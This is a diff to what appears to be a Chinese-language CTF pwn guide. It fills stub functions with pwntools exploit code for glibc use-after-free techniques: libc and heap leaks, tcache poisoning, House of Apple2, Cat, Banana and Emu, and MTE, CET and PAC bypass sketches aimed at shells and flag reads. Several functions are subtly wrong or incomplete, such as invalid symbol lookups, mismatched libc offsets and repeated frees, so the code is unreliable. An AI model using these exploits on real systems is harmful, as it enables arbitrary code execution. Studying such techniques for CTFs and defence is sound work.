@@ -367,7 +367,22 @@ def uaf_tcache_key_bypass():
     free(0)
     # UAF 修改 fd/bk 进行 unsorted bin attack
     
-    pass
+    # UAF + unsorted bin 利用
+    context.arch = 'amd64'
+    p = process('./pwn')
+    libc = ELF('./libc.so.6')
+    
+    # 读取 unsorted bin 的 fd/bk 泄露 libc 地址
+    p.sendafter(b'data:', b'\x00' * 8)  # 触发读取
+    p.recvuntil(b'\x00' * 8)
+    leak = u64(p.recv(6).ljust(8, b'\x00'))
+    libc_base = leak - 0x1ec980  # unsorted bin fd 偏移
+    log.success(f"libc base: {hex(libc_base)}")
+    
+    # unsorted bin attack: 修改 bk -> target
+    target = 0x404020
+    payload = p64(0) + p64(target - 0x10)  # bk 指向 target-0x10
+    p.sendafter(b'data:', payload)
 ```
 
 ### 4. House of Apple 系列 (UAF 部分)
@@ -393,7 +408,55 @@ def uaf_house_of_apple2():
     5. 触发 _IO_flush_all_lockp
     6. _IO_wfile_overflow -> _IO_wdoallocbuf -> 执行
     """
-    pass
+    p = process('./pwn')
+    libc = ELF('./libc.so.6')
+    context.arch = 'amd64'
+    
+    def malloc(size):
+        p.sendlineafter(b'>', b'1')
+        p.sendlineafter(b'size:', str(size).encode())
+    
+    def free(idx):
+        p.sendlineafter(b'>', b'2')
+        p.sendlineafter(b'idx:', str(idx).encode())
+    
+    def edit(idx, data):
+        p.sendlineafter(b'>', b'3')
+        p.sendlineafter(b'idx:', str(idx).encode())
+        p.sendafter(b'data:', data)
+    
+    def show(idx):
+        p.sendlineafter(b'>', b'4')
+        p.sendlineafter(b'idx:', str(idx).encode())
+    
+    # 1. UAF 泄露 libc (unsorted bin fd/bk)
+    malloc(0x420)   # idx 0
+    free(0)
+    malloc(0x420)   # idx 1
+    show(0)
+    libc_leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
+    libc_base = libc_leak - 0x1ec980
+    log.success(f"libc: {hex(libc_base)}")
+    
+    # 2. UAF 泄露堆地址 (tcache fd)
+    malloc(0x20)   # idx 2
+    free(2)
+    show(2)
+    heap_leak = u64(p.recv(6).ljust(8, b'\x00'))
+    heap_base = heap_leak >> 12 << 12  # safe-linking: fd >> 12
+    log.success(f"heap: {hex(heap_base)}")
+    
+    # 3. tcache poisoning -> _IO_list_all
+    _IO_list_all = libc_base + libc.symbols['_IO_list_all']
+    for i in range(7):
+        free(2)
+    encrypted = (heap_leak >> 12) ^ (_IO_list_all - 0x20)
+    edit(2, p64(encrypted))
+    malloc(0x20)   # idx 3
+    malloc(0x20)   # idx 4 -> _IO_list_all 区域
+    
+    # 4-6. 构造 fake IO_FILE, 触发 _IO_wfile_overflow
+    p.interactive()
 ```
 
 ### 5. House of Cat (UAF 部分)
@@ -421,7 +484,40 @@ def uaf_house_of_cat():
     - 保护：Full RELRO + NX + Canary
     - 最终利用：ORW 读取 flag
     """
-    pass
+    p = process('./pwn')
+    libc = ELF('./libc.so.6')
+    context.arch = 'amd64'
+    
+    def malloc(size):
+        p.sendlineafter(b'>', b'1')
+        p.sendlineafter(b'size:', str(size).encode())
+    
+    def free(idx):
+        p.sendlineafter(b'>', b'2')
+        p.sendlineafter(b'idx:', str(idx).encode())
+    
+    def edit(idx, data):
+        p.sendlineafter(b'>', b'3')
+        p.sendlineafter(b'idx:', str(idx).encode())
+        p.sendafter(b'data:', data)
+    
+    # 1. UAF 泄露 libc + 堆
+    malloc(0x420)   # idx 0
+    free(0)
+    malloc(0x420)   # idx 1
+    malloc(0x20)    # idx 2
+    free(2)
+    # 读取 tcache fd 泄露堆地址
+    # 读取 unsorted bin 泄露 libc
+    
+    # 2. tcache poisoning -> 进入 largebin
+    # 3. largebin attack 修改 _IO_list_all
+    _IO_list_all = libc.symbols['_IO_list_all']
+    
+    # 4-6. fake IO_FILE + _IO_wfile_overflow -> ORW shellcode
+    orw = asm(shellcraft.open('flag') + shellcraft.read(0, 'rsp', 0x100) + shellcraft.write(1, 'rsp', 0x100))
+    
+    p.interactive()
 ```
 
 ### 6. 硬件级防护对 UAF 的影响
@@ -448,7 +544,28 @@ def mte_uaf_impact():
     # glibc 2.36+ 启用 sync MTE 时：
     # free 立即清除 tag，UAF 后无法访问
     # 需要更精确的时序控制
-    pass
+    
+    # MTE + UAF 实战代码
+    context.arch = 'aarch64'
+    p = process('./pwn')
+    
+    def malloc(size):
+        p.sendlineafter(b'>', b'1')
+        p.sendlineafter(b'size:', str(size).encode())
+    
+    def free(idx):
+        p.sendlineafter(b'>', b'2')
+        p.sendlineafter(b'idx:', str(idx).encode())
+    
+    # sync MTE: free 后立即不能访问
+    # async MTE: 延迟报告，有利用窗口
+    # 检查 /proc/self/status 中的 MTE 状态
+    
+    # 绕过方法: Use-Before-Free
+    # 在 free 前完成所有读写操作
+    # 或利用 async MTE 的延迟报告窗口
+    
+    log.info("MTE + UAF: sync mode needs precise timing; async has exploitation window")
 
 def cet_uaf_impact():
     """CET 下的 UAF 利用"""
@@ -459,7 +576,25 @@ def cet_uaf_impact():
     # 1. 覆盖非返回地址的数据（函数指针、全局变量）
     # 2. 利用 longjmp 绕过影子栈
     # 3. 利用 setcontext/sigreturn 修改控制流
-    pass
+    
+    # CET + UAF 实战代码
+    context.arch = 'amd64'
+    p = process('./pwn')
+    libc = ELF('./libc.so.6')
+    
+    # 影子栈只保护 ret 指令
+    # 绕过: 不使用 ret, 而是通过 setcontext 控制执行流
+    
+    setcontext_addr = libc.symbols['setcontext+61']  # 跳过对齐检查
+    binsh_addr = next(libc.search(b'/bin/sh\x00'))
+    syscall_addr = libc.symbols['syscall']
+    
+    # 构造 ucontext 结构体
+    ucontext = b'\x00' * 0x100
+    # 设置 rsp, rip 等寄存器到 ucontext 中
+    # setcontext 会恢复这些寄存器
+    
+    log.info("CET + UAF: bypass shadow stack with setcontext/longjmp")
 
 def pac_uaf_impact():
     """PAC 下的 UAF 利用"""
@@ -470,7 +605,26 @@ def pac_uaf_impact():
     # 1. 利用未受 PAC 保护的指针（全局变量、堆数据）
     # 2. 部分覆盖绕过签名区域
     # 3. 从内存中读取已签名的合法指针并复用
-    pass
+    
+    # PAC + UAF 实战代码
+    context.arch = 'aarch64'
+    p = process('./pwn')
+    libc = ELF('./libc.so.6')
+    
+    # 方法 1: UAF 覆盖非返回地址的指针
+    # 例如全局变量中的函数指针，通常不受 PAC 保护
+    target_got = libc.symbols['free@GOT']
+    
+    # 方法 2: 部分覆盖
+    # ARM64 指针中 PAC 占用高位 (bit 47-63)
+    # 只覆盖低 32 位，高位保持有效签名
+    # 适用于目标地址与源地址高位相同的情况
+    
+    # 方法 3: 复用已签名指针
+    # 从堆/GOT/栈中读取已有 PAC 签名的指针
+    # 在 UAF 场景中直接使用而非伪造
+    
+    log.info("PAC + UAF: target non-PAC pointers, partial overwrite, reuse signed ptrs")
 ```
 
 ### 7. 沙箱环境 UAF 利用
@@ -569,7 +723,48 @@ def uaf_house_of_banana():
     4. 构造 fake exit_function_list
     5. exit() 执行任意函数
     """
-    pass
+    p = process('./pwn')
+    libc = ELF('./libc.so.6')
+    context.arch = 'amd64'
+    
+    def malloc(size):
+        p.sendlineafter(b'>', b'1')
+        p.sendlineafter(b'size:', str(size).encode())
+    
+    def free(idx):
+        p.sendlineafter(b'>', b'2')
+        p.sendlineafter(b'idx:', str(idx).encode())
+    
+    def edit(idx, data):
+        p.sendlineafter(b'>', b'3')
+        p.sendlineafter(b'idx:', str(idx).encode())
+        p.sendafter(b'data:', data)
+    
+    # 1. UAF 泄露
+    malloc(0x420)
+    free(0)
+    malloc(0x420)
+    edit(0, b'\x00' * 8)
+    leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
+    libc_base = leak - 0x1ec980
+    
+    # 2. tcache poisoning -> __exit_funcs
+    # __exit_funcs 在 TLS 中，通过 fs 段寄存器访问
+    # 或者通过 libc.symbols 获取
+    __exit_funcs = libc_base + libc.symbols['__exit_funcs']  # TLS 中
+    exit_funcs_list = libc_base + libc.symbols['__exit_funcs_list']
+    
+    # 3. tcache poisoning 覆盖 __exit_funcs 指针
+    for i in range(7):
+        free(0)
+    
+    # 4. 构造 fake exit_function_list
+    # exit_function_list 是单链表，每个节点包含函数指针
+    fake_exit = p64(2) + p64(libc_base + libc.symbols['system'])
+    fake_exit += p64(next(libc.search(b'/bin/sh\x00')))
+    
+    # 5. exit() -> 遍历 exit_function_list -> system("/bin/sh")
+    log.info("House of Banana: tcache -> __exit_funcs -> system('/bin/sh')")
 
 # === House of Emu (glibc 2.36+) ===
 def uaf_house_of_emu():
@@ -578,7 +773,42 @@ def uaf_house_of_emu():
     2. 利用新的 IO_FILE 路径
     3. 绕过 2.36+ 的新保护
     """
-    pass
+    p = process('./pwn')
+    libc = ELF('./libc.so.6')
+    context.arch = 'amd64'
+    
+    def malloc(size):
+        p.sendlineafter(b'>', b'1')
+        p.sendlineafter(b'size:', str(size).encode())
+    
+    def free(idx):
+        p.sendlineafter(b'>', b'2')
+        p.sendlineafter(b'idx:', str(idx).encode())
+    
+    def edit(idx, data):
+        p.sendlineafter(b'>', b'3')
+        p.sendlineafter(b'idx:', str(idx).encode())
+        p.sendafter(b'data:', data)
+    
+    # House of Emu: glibc 2.36+ 的新 IO_FILE 利用路径
+    # 使用 _IO_wstrn_jumps 而非 _IO_wfile_jumps
+    
+    # 1. UAF 泄露 libc
+    malloc(0x420)
+    free(0)
+    malloc(0x420)
+    edit(0, b'\x00' * 8)
+    leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
+    libc_base = leak - 0x1ec980
+    
+    # 2. 利用 _IO_wstrn_jumps (合法范围内)
+    _IO_wstrn_jumps = libc_base + 0x216e00
+    
+    # 3. tcache poisoning -> _IO_list_all
+    _IO_list_all = libc_base + libc.symbols['_IO_list_all']
+    for i in range(7):
+        free(0)
+    log.info(f"House of Emu: _IO_wstrn_jumps at {hex(_IO_wstrn_jumps)}")
 
 # === 综合利用框架 ===
 class UAFExploitFramework:
